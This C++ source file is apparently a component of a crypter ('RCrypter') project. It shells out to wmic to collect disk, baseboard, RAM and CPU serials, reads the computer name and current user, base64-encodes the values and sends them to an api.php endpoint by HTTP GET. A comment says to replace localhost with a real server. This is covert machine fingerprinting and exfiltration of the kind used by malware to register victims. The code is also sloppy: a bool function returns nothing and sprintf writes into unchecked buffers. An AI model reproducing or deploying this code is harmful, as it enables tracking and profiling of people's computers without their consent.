#include "RCrypter.h"
#include "Web.hpp"
#include "base64.h"

#include <vector>

string Execute(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}


class SerialNumber {
public:
	string SerialNumber_Packed;
	SerialNumber(string Device) {
		char WmicBuffer[64];
		sprintf(WmicBuffer, "wmic %s get serialnumber", Device.c_str());
		this->SerialNumber_Packed = base64_encode(Web::ReplaceAll(Execute(WmicBuffer), "SerialNumber\n", "")); // Base64 encodes output and replaces Name\n to remove any extra strings
	} 
};

class CPUInfo {
public:
	string Name;
	CPUInfo() {
		char WmicBuffer[64];
		sprintf(WmicBuffer, "wmic cpu get name");
		this->Name = base64_encode(Web::ReplaceAll(Execute(WmicBuffer), "Name\n", "")); // Base64 encodes output and replaces Name\n to remove any extra strings
	}
};


class PCInfo {
public:
	string PC_Name;

	string CurrentUser;

	SerialNumber* Disk;
	SerialNumber* Baseboard;
	SerialNumber* RAM;

	CPUInfo* CPU;

	PCInfo() {
		char pcNameBuffer[100]; // defines pcNameBuffer
		DWORD pcNameSize = sizeof(pcNameBuffer); // sets size of pcNameBuffer

		GetComputerName(pcNameBuffer, &pcNameSize);
		this->PC_Name = base64_encode(pcNameBuffer);

		char userNameBuffer[100]; // defines userNameBuffer
		DWORD userNameSize = sizeof(userNameBuffer); // sets size of userNameBuffer

		GetUserName(userNameBuffer, &userNameSize);
		this->CurrentUser = base64_encode(userNameBuffer);

		this->Disk = new SerialNumber("diskdrive"); // gets disk serialnumber
		this->Baseboard = new SerialNumber("baseboard"); // gets baseboard serialnumber
		this->RAM = new SerialNumber("memorychip"); // gets ram serialnumber

		this->CPU = new CPUInfo();
	}

	bool PushData() {
		char PackedBuffer[1024];
		sprintf(PackedBuffer, "%s|%s|%s|%s|%s|%s|",
			this->PC_Name.c_str(),
			this->CurrentUser.c_str(),
			this->Disk->SerialNumber_Packed.c_str(),
			this->Baseboard->SerialNumber_Packed.c_str(),
			this->RAM->SerialNumber_Packed.c_str(),
			this->CPU->Name.c_str()
		);

		string StringedBuffer(PackedBuffer);

		// change localhost to ip/domain
		Web::DoGET("http://localhost/api.php?data=" + StringedBuffer);
	}
};